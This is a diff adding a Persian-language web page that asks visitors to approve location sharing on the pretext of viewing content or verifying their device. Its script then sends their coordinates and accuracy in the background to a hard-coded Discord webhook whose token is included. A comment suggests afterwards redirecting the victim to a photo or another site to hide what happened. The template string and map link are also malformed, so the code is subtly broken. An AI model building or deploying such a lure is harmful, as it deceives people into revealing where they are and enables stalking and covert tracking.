@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>صفحه دریافت اطلاعات</title>
+<style>
+body { font-family: Tahoma, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f9; }
+.container { max-width: 500px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+button { background-color: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+</style>
+</head>
+<body>
+
+<div class="container">
+<h2>به صفحه اشتراک‌گذاری خوش آمدید</h2>
+<p>برای مشاهده محتوا یا تایید دستگاه، لطفاً دسترسی به موقعیت مکانی را تایید کنید.</p>
+<button onclick="getLocation()">تایید و اشتراک‌گذاری لوکیشن</button>
+</div>
+
+<script>
+// آدرس وب‌هوک دیسکورد خود را اینجا قرار دهید
+const webhookURL = "https://discord.com/api/webhooks/1546049040666329158/OZXLvUVEHRUqvpze-tNNxcX71fiXhN6sj0FutQHeJl81beRXtqrZ2Xj6q_sF3zp45nWn
+";
+
+function getLocation() {
+if (navigator.geolocation) {
+// درخواست لوکیشن از مرورگر
+navigator.geolocation.getCurrentPosition(sendLocationToServer, showError);
+} else {
+alert("مرورگر شما از این قابلیت پشتیبانی نمی‌کند.");
+}
+}
+
+function sendLocationToServer(position) {
+const latitude = position.coords.latitude;
+const longitude = position.coords.longitude;
+const accuracy = position.coords.accuracy;
+
+// ساخت پیام برای ارسال به دیسکورد
+const payload = {
+content: 📍 **لوکیشن جدید دریافت شد!**\n🔗 گوگل مپس: https://google.com{latitude},${longitude}\n🎯 دقت: ${accuracy} متر
+};
+
+// ارسال داده‌ها به صورت پس‌زمینه
+fetch(webhookURL, {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify(payload)
+})
+.then(response => {
+alert("موقعیت شما با موفقیت تایید شد.");
+// در اینجا می‌توانید کاربر را به یک عکس یا سایت دیگر هدایت کنید
+// window.location.href = "https://example.com";
+})
+.catch(error => console.error('Error:', error));
+}
+
+function showError(error) {
+switch(error.code) {
+case error.PERMISSION_DENIED:
+alert("کاربر دسترسی به لوکیشن را رد کرد.");
+break;
+case error.POSITION_UNAVAILABLE:
+alert("اطلاعات موقعیت مکانی در دسترس نیست.");
+break;
+case error.TIMEOUT:
+alert("زمان درخواست به پایان رسید.");
+break;
+}
+}
+</script>
+
+</body>
+</html>
